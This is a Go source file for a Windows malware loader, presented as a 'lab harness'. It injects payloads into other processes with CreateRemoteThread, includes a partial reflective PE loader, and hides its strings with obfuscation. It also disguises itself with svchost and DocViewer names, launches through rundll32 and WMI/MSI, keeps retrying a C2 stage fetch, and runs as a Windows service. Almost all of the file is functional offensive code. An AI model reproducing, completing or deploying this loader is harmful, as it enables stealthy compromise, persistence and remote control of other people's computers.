// Reflective / remote-thread loader — lab harness (Windows).
// Build:
//   exe:  GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o loader.exe .
//   dll:  CC=x86_64-w64-mingw32-gcc CGO_ENABLED=1 GOOS=windows GOARCH=amd64 \
//           go build -buildmode=c-shared -o loader.dll .
//
// WMI/MSI call path:
//   rundll32.exe "<PayloadPath>",EntryPoint
// EntryPoint export lives in entry_cgo.go (c-shared build only).

package main

import (
	"bytes"
	"debug/pe"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

func defaultTargetProc() string { return xob(eDefaultProc) }

var (
	modKernel32              = syscall.NewLazyDLL(xob(eKernel32))
	procVirtualAllocEx       = modKernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory   = modKernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread   = modKernel32.NewProc("CreateRemoteThread")
	procOpenProcess          = modKernel32.NewProc("OpenProcess")
	procCloseHandle          = modKernel32.NewProc("CloseHandle")
	procCreateToolhelp32Snap = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW      = modKernel32.NewProc("Process32FirstW")
	procProcess32NextW       = modKernel32.NewProc("Process32NextW")
	procModule32FirstW       = modKernel32.NewProc("Module32FirstW")
	procModule32NextW        = modKernel32.NewProc("Module32NextW")
	procVirtualAlloc         = modKernel32.NewProc("VirtualAlloc")
	procWinExec              = modKernel32.NewProc("WinExec")
)

const (
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
	TH32CS_SNAPPROCESS        = 0x00000002
	INVALID_HANDLE_VALUE      = ^uintptr(0)
)

type processEntry32 struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriorityClassBase int32
	Flags             uint32
	ExeFile           [260]uint16
}

func targetProc() string {
	if v := os.Getenv(xob(eEnvTargetProc)); v != "" {
		return v
	}
	if p := bakedTargetProc(); p != "" {
		return p
	}
	return defaultTargetProc()
}

type Loader struct {
	ProcessName string
	Payload     []byte
}

func NewLoader(processName string, payload []byte) *Loader {
	return &Loader{ProcessName: processName, Payload: payload}
}

func (l *Loader) Load() error {
	if len(l.Payload) == 0 {
		return fmt.Errorf("empty payload")
	}
	pid, err := findProcess(l.ProcessName)
	if err != nil {
		return err
	}
	access := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
	h, _, e := procOpenProcess.Call(uintptr(access), 0, uintptr(pid))
	if h == 0 {
		return fmt.Errorf("OpenProcess: %v", e)
	}
	defer procCloseHandle.Call(h)

	addr, _, e := procVirtualAllocEx.Call(h, 0, uintptr(len(l.Payload)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", e)
	}
	var written uintptr
	r, _, e := procWriteProcessMemory.Call(h, addr, uintptr(unsafe.Pointer(&l.Payload[0])), uintptr(len(l.Payload)), uintptr(unsafe.Pointer(&written)))
	if r == 0 {
		return fmt.Errorf("WriteProcessMemory: %v", e)
	}
	var tid uint32
	th, _, e := procCreateRemoteThread.Call(h, 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&tid)))
	if th == 0 {
		return fmt.Errorf("CreateRemoteThread: %v", e)
	}
	procCloseHandle.Call(th)
	return nil
}

func findProcess(name string) (uint32, error) {
	snap, _, e := procCreateToolhelp32Snap.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == INVALID_HANDLE_VALUE {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot: %v", e)
	}
	defer procCloseHandle.Call(snap)
	var entry processEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	r, _, e := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if r == 0 {
		return 0, fmt.Errorf("Process32First: %v", e)
	}
	for {
		exe := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(exe, name) {
			return entry.ProcessID, nil
		}
		r, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if r == 0 {
			break
		}
	}
	return 0, fmt.Errorf("process not found: %s", name)
}

// Reflective PE (local) — headers/sections copy; reloc/IAT still lab stubs.

type ReflectiveLoader struct {
	Image []byte
}

func NewReflectiveLoader(image []byte) *ReflectiveLoader {
	return &ReflectiveLoader{Image: image}
}

func (r *ReflectiveLoader) calculateImageSize(f *pe.File) uint32 {
	var max uint32
	for _, s := range f.Sections {
		end := s.VirtualAddress + s.VirtualSize
		if end > max {
			max = end
		}
	}
	if oh, ok := f.OptionalHeader.(*pe.OptionalHeader64); ok && oh.SizeOfImage > max {
		return oh.SizeOfImage
	}
	if max == 0 {
		return uint32(len(r.Image))
	}
	return max
}

func (r *ReflectiveLoader) copyHeaders(_ *pe.File, base uintptr) {
	n := 0x1000
	if len(r.Image) < n {
		n = len(r.Image)
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(base)), n)
	copy(dst, r.Image[:n])
}

func (r *ReflectiveLoader) copySections(f *pe.File, base uintptr) {
	for _, s := range f.Sections {
		data, err := s.Data()
		if err != nil || len(data) == 0 {
			continue
		}
		dst := unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(s.VirtualAddress))), len(data))
		copy(dst, data)
	}
}

func (r *ReflectiveLoader) processRelocations(f *pe.File, base uintptr) { _, _ = f, base }
func (r *ReflectiveLoader) resolveImports(f *pe.File, base uintptr)     { _, _ = f, base }

func (r *ReflectiveLoader) Load() (uintptr, error) {
	f, err := pe.NewFile(bytes.NewReader(r.Image))
	if err != nil {
		return 0, fmt.Errorf("parse PE: %w", err)
	}
	defer f.Close()
	size := r.calculateImageSize(f)
	imageBase, _, e := procVirtualAlloc.Call(0, uintptr(size), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if imageBase == 0 {
		return 0, fmt.Errorf("VirtualAlloc: %v", e)
	}
	r.copyHeaders(f, imageBase)
	r.copySections(f, imageBase)
	r.processRelocations(f, imageBase)
	r.resolveImports(f, imageBase)
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, fmt.Errorf("only PE32+ (x64) supported")
	}
	return imageBase + uintptr(oh.AddressOfEntryPoint), nil
}

func selfDir() string {
	// When loaded via rundll32, os.Executable is often rundll32.exe — fall back to
	// PAYLOAD_PATH / ProgramData DocViewer layout used by WMI/MSI.
	exe, err := os.Executable()
	if err == nil {
		base := strings.ToLower(filepath.Base(exe))
		if base != xob(eRundll32) && base != xob(eRegsvr32) {
			return filepath.Dir(exe)
		}
	}
	if p := os.Getenv(xob(eEnvPayloadPath)); p != "" {
		return filepath.Dir(p)
	}
	return xob(eEdgeDir)
}

// payloadNames are the on-disk payload filenames the loader looks for.
func payloadNames() []string {
	return []string{xob(eSvchostName), xob(eAgentName), xob(ePayloadName)}
}

func readPayload() ([]byte, error) {
	self := selfExe()
	if len(os.Args) > 1 {
		// rundll32 passes junk args after EntryPoint — only treat as path if file exists
		cand := os.Args[1]
		if strings.ToLower(filepath.Clean(cand)) == self {
			return []byte{0xC3}, nil
		}
		if fi, err := os.Stat(cand); err == nil && !fi.IsDir() {
			return os.ReadFile(cand)
		}
	}
	if p := os.Getenv(xob(eEnvPayloadPath)); p != "" {
		// PAYLOAD_PATH may point at the DLL itself (WMI default). Prefer sibling agent.
		if !strings.HasSuffix(strings.ToLower(p), ".dll") {
			if strings.ToLower(filepath.Clean(p)) == self {
				return []byte{0xC3}, nil
			}
			if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
				return b, nil
			}
		}
	}

	for _, name := range append(payloadNames(), filepath.Join("..", xob(eAgentName))) {
		p := filepath.Join(selfDir(), name)
		if fi, err := os.Stat(p); err == nil && !fi.IsDir() {
			if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
				return b, nil
			}
		}
	}

	for _, p := range []string{xob(eSvchostPF), xob(eSvchostPD)} {
		if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
			return b, nil
		}
	}
	return []byte{0xC3}, nil
}

// runOnce performs the lab inject/start path once (shared by main and EntryPoint).
func runOnce() error {
	// v1.9.0: retry C2 stage fetch until it succeeds. When the C2 server is
	// temporarily down (reboot, VM restart), the loader keeps trying so that
	// the agent eventually comes online without manual service restart.
	if stageURL() != "" {
		retryWait := 10 // default seconds between retries
		if v := os.Getenv(xob(eEnvRetryWait)); v != "" && !strings.HasPrefix(v, "{{") {
			if n, err := strconv.Atoi(v); err == nil && n > 0 {
				retryWait = n
			}
		}
		for {
			if err := runStage(); err == nil {
				return nil
			} else {
				fmt.Fprintf(os.Stderr, xob(eDiagStagerRetry), err, retryWait)
				time.Sleep(time.Duration(retryWait) * time.Second)
			}
		}
	}
	payload, err := readPayload()
	if err != nil {
		return err
	}
	proc := targetProc()
	fmt.Fprintf(os.Stderr, xob(eDiagLabTarget), proc, len(payload))
	if len(payload) <= 4 {
		fmt.Fprintln(os.Stderr, xob(eDiagNoPayload))
		return nil
	}
	// Prefer spawning agent as a child when payload is a PE (MZ). More reliable for lab
	// than CreateRemoteThread of a full PE image (reloc/IAT still stubs).
	if len(payload) > 2 && payload[0] == 'M' && payload[1] == 'Z' {
		if path := findPayloadPath(); path != "" {
			return startAgentProcess(path)
		}
	}
	l := NewLoader(proc, payload)
	if err := l.Load(); err != nil {
		if path := findPayloadPath(); path != "" {
			return startAgentProcess(path)
		}
		return err
	}
	fmt.Fprintln(os.Stderr, xob(eDiagInjectOK))
	return nil
}

func selfExe() string {
	if p, err := os.Executable(); err == nil {
		return filepath.Clean(strings.ToLower(p))
	}
	return ""
}

func findPayloadPath() string {
	self := selfExe()
	if p := os.Getenv(xob(eEnvAgentPath)); p != "" {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	dir := selfDir()
	for _, name := range []string{xob(eSvchostName), xob(eAgentName)} {
		p := filepath.Join(dir, name)
		if strings.ToLower(p) == self {
			continue
		}
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	for _, p := range []string{xob(eSvchostPF), xob(eSvchostPD)} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

func startAgentProcess(path string) error {
	// SW_HIDE = 0
	line := path
	r, _, e := procWinExec.Call(uintptr(unsafe.Pointer(syscall.StringBytePtr(line))), 0)
	if r < 32 {
		return fmt.Errorf("WinExec failed code=%d err=%v path=%s", r, e, path)
	}
	fmt.Fprintf(os.Stderr, xob(eDiagWinExecOK), path)
	return nil
}

var entryOnce sync.Once

func entryPointMain() {
	entryOnce.Do(func() {
		if err := runOnce(); err != nil {
			fmt.Fprintf(os.Stderr, xob(eDiagEntryPoint), err)
		}
	})
}

func main() {
	// v1.7.1 staged service: when SCM starts the loader as DocViewer,
	// run as a service (in-memory bootstrap) and let SCM manage it.
	if runAsService() {
		return
	}
	if err := runOnce(); err != nil {
		fmt.Fprintf(os.Stderr, xob(eDiagInjectFail), err)
		os.Exit(1)
	}
}
